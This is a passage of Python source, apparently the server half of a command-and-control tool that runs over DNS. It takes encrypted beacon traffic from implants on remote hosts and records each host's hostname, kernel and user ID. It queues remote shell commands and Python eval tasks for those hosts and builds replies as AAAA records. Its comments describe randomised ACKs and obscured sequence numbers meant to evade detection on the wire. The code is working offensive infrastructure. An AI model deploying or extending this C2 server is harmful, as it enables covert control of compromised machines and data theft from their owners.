        else:
            logging.debug("Non-data packet received (Diffie-Hellman exchange)")
            # New session, new stream
            if session not in sessions:
                logging.debug("New session, new stream")
                sessions[session] = {"key": None, "iv": None, "outbound_queue": {}, "streams": {},
                                     "info": {"hostname": None, "kernel": None, "uid": None, "source_ip": source_ip},
                                     "interval": None, "checkins": 0, "version": None, "last_seen": None, "waiting": ""}
                sessions[session]["streams"][stream] = {"total_pkts": total,
                                                        "pkts": [None] * total, "expiry": default_expiry}

            # Existing session
            else:
                logging.debug("Existing session")
                # Existing session, existing stream
                if stream in sessions[session]["streams"]:
                    logging.debug("Existing stream")
                    # Stream is expired, stop parsing this packet
                    if (
                        sessions[session]["streams"][stream]["expiry"] and
                        int(time.time()) > sessions[session]["streams"][stream]["expiry"]
                    ):
                        logging.debug("Expired stream!")
                        return msg, domain, response

                    # Stream is not expired (not yet responded to)
                    # It will get processed in the code outside this if
                    else:
                        pass

                # Existing session, new stream
                else:
                    logging.debug("New stream")
                    sessions[session]["streams"][stream] = {"total_pkts": total,
                                                            "pkts": [None] * total, "expiry": default_expiry}

            try:
                if data in sessions[session]["streams"][stream]["pkts"]:
                    logging.debug("Already have this packet")
                    # We already have this packet, ignore it
                    return msg, domain, response

                # We don't have the packet yet, store it in memory.
                sessions[session]["streams"][stream]["pkts"][seq] = data
                logging.debug("New packet stored")
            except KeyError:
                # The stream must have been deleted by another thread
                logging.exception("Stream must have been deleted elsewhere - it's ok, this is non-fatal")
                pass

        sessions[session]["last_seen"] = int(time.time())
        sessions[session]["info"]["source_ip"] = source_ip

        # After storing a new packet, check if the message is
        # complete and ready to be decrypted. If it is, return
        # whatever answer the server deems correct.
        msg = self.assemble_message(session, stream, is_data)
        if is_data:
            response = self.respond(msg, session)
        return msg, domain, response

    def assemble_message(self, session, stream_id, is_data=True):
        '''Determine if a message has been completely received. If it has been, reassemble and decrypt it.'''
        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        stream = sessions[session]["streams"][stream_id]
        msg = ""

        # Message completely received. Reassemble packets in order.
        if None not in stream["pkts"]:
            logging.debug("Message completely received. Reassembling packets in order.")
            for i in range(stream["total_pkts"]):
                pkt = stream["pkts"][i]
                msg = msg + pkt.replace('w', '=').replace('-', 'w').upper()

        # Message incomplete, there are packets yet to be received.
        else:
            return None

        msg = base64.b32decode(msg)

        # Data packets are AES encrypted strings.
        # Non-data packets are plaintext integers/longs.
        if is_data:
            key = utils.int_to_bytes(sessions[session]["key"])
            iv = utils.int_to_bytes(sessions[session]["iv"])
            backend = default_backend()
            aes = Cipher(algorithms.AES(key), modes.CTR(iv), backend=backend)
            aes_dec = aes.decryptor()

            msg = aes_dec.update(msg)

            # Sometimes we receive non-utf-8 (random) data
            try:
                msg = msg.decode()
            except:
                pass

        else:
            B = utils.int_from_bytes(msg[:32], 'big')
            iv = utils.int_from_bytes(msg[32:], 'big')
            msg = {"B": B, "iv": iv}

        # Mark the stream for expiry. We can't delete the stream
        # once we're done with it because the client may be
        # repeating requests multiple times, so we need a way to
        # keep track of streams we've completed. If we deleted
        # the stream from memory, the repeat requests would
        # only create the stream again.
        #
        # Mark the stream for deletion 90 seconds from now, which
        # should give the client enough time to receive our response
        # which will cause it to stop sending retries.
        sessions[session]["streams"][stream_id]["expiry"] = int(time.time()) + 90

        return msg

    def respond(self, msg, session):
        '''Determine the correct response and return the encrypted payload: a list of 16 byte packets.
        Packets are sent to the client as AAAA answers by BeaconResolver.resolve().'''
        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        logging.debug("Responding to (%s) %s", session, msg)
        if msg is None:
            return None

        response = []

        # Figure out what the response should be.
        # Default ACK is a bunch of random data, to make ACKs not look the same on the wire.
        received_type, msg = msg.split('|', 1)
        received_type = int(received_type)
        ack = "0|" + base64.b16encode(os.urandom(randint(2, 6))).lower().decode()

        # Beacon checking in, ACK it
        if received_type == 1:
            random, interval = msg.split('|')

            # Pre-emptitively set the interval to whatever we are going to task the client to set it to
            try:
                if "next:" in sessions[session]["interval"]:
                    next_interval = sessions[session]["interval"].split()[-1].strip(')')
                    if next_interval.isdigit():
                        sessions[session]["interval"] = next_interval
                    else:
                        sessions[session]["interval"] = interval
                else:
                    sessions[session]["interval"] = interval
            except TypeError:
                sessions[session]["interval"] = interval

            sessions[session]["checkins"] = sessions[session]["checkins"] + 1

            logging.debug("Client checking in. Callback interval %s seconds. ACKing it.", interval)
            response.append(ack)
        # Client terminated self, remove session
        elif received_type == 2:
            logging.debug("Client terminated itself. Removing session.")
            del sessions[session]
            return None
        # Initialization message
        elif received_type == 3:
            version, hostname, kernel, uid, interval = msg.split('|')

            sessions[session]["version"] = version
            sessions[session]["interval"] = interval
            info = {"hostname": hostname, "kernel": kernel, "uid": uid}
            sessions[session]["info"] = {**sessions[session]["info"], **info}

            logging.debug("Client init {Version: %s, Hostname: %s, Kernel: %s, UID: %s, Interval: %s}.", # ACKing it.",
                          version, hostname, kernel, uid, interval)

            # If there is an autotask set, run it now
            if meta['autotask']:
                if meta['autotask_is_script']:
                    logging.debug("Running autotask script: %s", meta['autotask'])

                    autotask_script = eval("lambda session, sessions, session_id: " + meta['autotask'])
                    response.append(autotask_script(sessions[session], sessions, session))
                else:
                    response.append(meta['autotask'])

                logging.debug("Sending autotask data: %s", response[-1])
            else:
                response.append(ack)
        # Network interface data
        elif received_type == 6:
            print('\n[!] Session', session, 'network interfaces:\n', msg)
            #response.append(ack)
        # Python code eval results
        elif received_type == 8:
            sessions[session]['waiting'] = ''
            print('\n[!] Session', session, 'responded to Python3 eval with:\n', msg)
        elif received_type == 80:
            print('\n[!] Session', session, 'responded to Python3 quiet eval with (retcode or exception name):\n', msg)
        # Arbitrary shell command execution results
        elif received_type == 9:
            sessions[session]['waiting'] = ''
            print('\n[!] Session', session, 'responded to shell command execution with:\n', msg)
        elif received_type == 90:
            print('\n[!] Session', session, 'responded to shell command quiet (async) execution with exit code:\n', msg)

        # Add any queued commands for this client
        # TODO: mark tasks as sent
        if sessions[session]["outbound_queue"]:
            logging.debug("Sending queued tasks.")
            response = response + list(sessions[session]["outbound_queue"].values())

        # Default, ACK
        if response is None:
            logging.debug("Sending default response.")
            response.append("0|kthx")

        # Join all responses with a ^
        response = "^".join(response).encode()

        # AES encryption
        key = utils.int_to_bytes(sessions[session]["key"])
        iv = utils.int_to_bytes(sessions[session]["iv"])
        backend = default_backend()
        aes = Cipher(algorithms.AES(key), modes.CTR(iv), backend=backend)
        aes_enc = aes.encryptor()

        response = aes_enc.update(response)

        packets = self.packetize_response(response)

        # TODO: receive an ACK for each sent command before purging
        # Here we assume the commands are all received by the client and acted upon.
        sessions[session]["outbound_queue"] = {}

        return packets

    def packetize_response(self, response_string):
        '''Responses are packetized. 15 data bytes per packet, for a total of 16 byte packets.
        Packet format: [1 byte sequence number][15 data bytes]'''

        pkt_length = 16

        # Packetize into 15 byte packets, leaving 1 byte of room for the sequence number
        data_length = pkt_length - 1
        packets = [b'%s' % response_string[i:i + data_length] for i in range(0, len(response_string), data_length)]
        logging.debug("Packets for DNS response assembly [pre sequence numbers]: %s", packets)

        # Prepend sequence number (obfuscated so every address in a new response doesn't begin with 01, 02, ...)
        # Sequence number format: [packet ordinal] XOR [last byte in packet]
        packets = [bytes.fromhex(hex(i+1 ^ packets[i][-1])[2:].rjust(2 , '0')) + packets[i] for i in range(0, len(packets))]
        logging.debug("Packets for DNS response assembly [pre padding]: %s", packets)

        # Ensure length of response is a multiple of 16, pad last packet with \x00
        packets[-1] = packets[-1].ljust(16, b'\x00')

        return packets

    def create_new_session(self, query, key, iv, source_ip):
        '''Accepts a dnslib query (from which the session is extracted), a key and an iv which are both integers.
        Returns the new session identifier (session cookie).'''
        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        # Associate the given AES key and IV pair with the client.
        query = str(query.qname)[:-1]
        old_session = query.split('.')[2]

        # New 4 byte session cookie that we aren't already using with another session.
        session = base64.b16encode(os.urandom(2)).lower().decode()
        while session in sessions:
            session = base64.b16encode(os.urandom(2)).lower().decode()

        sessions[session] = {"key": key, "iv": iv, "outbound_queue": {}, "streams": {},
                             "info": {"hostname": None, "kernel": None, "uid": None, "source_ip": source_ip},
                             "interval": None, "checkins": 0, "version": None, "last_seen": None, "waiting": ""}

        # Remove the old session from memory, it's not needed anymore.
        try:
            del sessions[old_session]
        except KeyError:
            pass

        logging.debug("New session set (%s): %s", session, sessions[session])
        # Send the client the new session cookie to use from now on
        return session

    def cleanup_expired_streams(self):
        '''Every 60 seconds delete expired streams to lower the memory footprint.'''
        if DEBUG:
            logging.debug('Checking for expired streams.')

        try:
            now = int(time.time())
            for session_id in sessions:
                for stream_id in sessions[session_id]["streams"]:
                    try:
                        if (
                            sessions[session_id]["streams"][stream_id]["expiry"] and
                            now > sessions[session_id]["streams"][stream_id]["expiry"]
                        ):
                            try:
                                del sessions[session_id]["streams"][stream_id]
                                logging.debug('Expired stream %s for session %s deleted.', stream_id, session_id)
                            except KeyError:
                                # Stream was deleted already. How? Mystery!
                                pass
                    except KeyError:
                        # Stream doesn't have an expiry date. It's brand new.
                        pass
        except RuntimeError:
            # Removing or adding dict items in-place upsets `for` loops.
            # Just keep trying. It'll be fine.
            if DEBUG:
                logging.debug('Recursively calling cleanup_expired_streams.')

            self.cleanup_expired_streams()
            return

        if DEBUG:
            logging.debug('Setting a new cleanup timer.')

        self.cleanup_timer = Timer(60, self.cleanup_expired_streams)
        self.cleanup_timer.daemon = True
        self.cleanup_timer.start()


class LocalDNSLogger(DNSLogger):
    '''Overload the default dnslib.DNSLogger in order to both use the logging module
    and to support DEBUG levels. The dnslib class uses crude print statements with a poor way to control them.

    Original class docs:
        The class provides a default set of logging functions for the various
        stages of the request handled by a DNSServer instance which are
        enabled/disabled by flags in the 'log' class variable.
        To customise logging create an object which implements the LocalDNSLogger
        interface and pass instance to DNSServer.
        The methods which the logger instance must implement are:
            log_recv          - Raw packet received
            log_send          - Raw packet sent
            log_request       - DNS Request
            log_reply         - DNS Response
            log_truncated     - Truncated
            log_error         - Decoding error
            log_data          - Dump full request/response
    '''

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def log_recv(self, handler, data):
        if DEBUG_DNS and DEBUG_DNS_BYTES:
            self.logger.debug("Received: [%s:%d] (%s) <%d> : %s",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              len(data),
                              binascii.hexlify(data))

    def log_send(self, handler, data):
        if DEBUG_DNS and DEBUG_DNS_BYTES:
            self.logger.debug("Sent: [%s:%d] (%s) <%d> : %s",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              len(data),
                              binascii.hexlify(data))

    def log_request(self, handler, request):
        if DEBUG_DNS:
            self.logger.debug("Request: [%s:%d] (%s) / '%s' (%s)",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              request.q.qname,
                              QTYPE[request.q.qtype])
            self.log_data(request)

    def log_reply(self, handler, reply):
        if DEBUG_DNS:
            self.logger.debug("Reply: [%s:%d] (%s) / '%s' (%s) / RRs: %s",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              reply.q.qname,
                              QTYPE[reply.q.qtype],
                              ",".join([QTYPE[a.rtype] for a in reply.rr]))
            self.log_data(reply)

    def log_truncated(self, handler, reply):
        if DEBUG_DNS:
            self.logger.debug("Truncated Reply: [%s:%d] (%s) / '%s' (%s) / RRs: %s",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              reply.q.qname,
                              QTYPE[reply.q.qtype],
                              ",".join([QTYPE[a.rtype] for a in reply.rr]))
            self.log_data(reply)

    def log_error(self, handler, e):
        if DEBUG_DNS:
            self.logger.error("Invalid Request: [%s:%d] (%s) :: %s",
                              handler.client_address[0],
                              handler.client_address[1],
                              handler.protocol,
                              e)

    def log_data(self, dnsobj):
        if DEBUG_DNS and DEBUG_DNS_BYTES:
            self.logger.debug("\n" + dnsobj.toZone("    ") + "\n")


def exit_handler(signal=None, frame=None):
    if dns_server:
        dns_server.stop()

    while True:
        choice = input('Save sessions to disk before exiting? [Y/n] ').strip().lower()
        if choice in ['', 'y']:
            filename = input('Filename? [%s] ' % sessions_filename).strip()
            if filename == '':
                save_sessions(sessions_filename)
                break
            else:
                save_sessions(filename)
                break
        elif choice == 'n':
            break

    sys.exit(0)


def print(*args, **kwargs):
    '''Overload print() in order to always flush output buffer.
    This prevents output from backing up and not being printed when in cmdloop.'''
    builtins.print(*args, **kwargs, flush=True)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('^C (use `exit` or CTRL+Z and `kill -9`)')
    except SystemExit:
        exit_handler()
    except Exception:
        logging.exception("Badness at the top level. Probably fatal.")
